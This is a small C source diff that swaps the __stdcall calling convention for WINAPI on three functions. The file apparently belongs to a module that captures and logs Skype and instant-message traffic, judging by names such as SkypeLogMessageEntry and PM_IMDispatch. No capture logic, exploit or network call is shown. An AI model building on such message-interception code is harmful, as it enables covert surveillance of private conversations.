@@ -230,7 +230,7 @@ void SkypeLogMessageEntry(im_skype_message_entry *skentry)
 	SAFE_FREE(author);
 }
 
-DWORD __stdcall PM_IMDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *time_nanosec)
+DWORD WINAPI PM_IMDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *time_nanosec)
 {
 	DWORD i, dummy;
 	COPYDATASTRUCT cd_struct;
@@ -395,7 +395,7 @@ DWORD __stdcall PM_IMDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *t
 }
 
 
-DWORD __stdcall PM_IMStartStop(BOOL bStartFlag, BOOL bReset)
+DWORD WINAPI PM_IMStartStop(BOOL bStartFlag, BOOL bReset)
 {
 	DWORD dummy;
 
@@ -439,7 +439,7 @@ DWORD __stdcall PM_IMStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD __stdcall PM_IMInit(JSONObject elem)
+DWORD WINAPI PM_IMInit(JSONObject elem)
 {
 	if (!im_skype_message_list)
 		im_skype_message_list = (im_skype_message_entry *)calloc(SKYPE_MESSAGE_BACKLOG, sizeof(im_skype_message_entry));
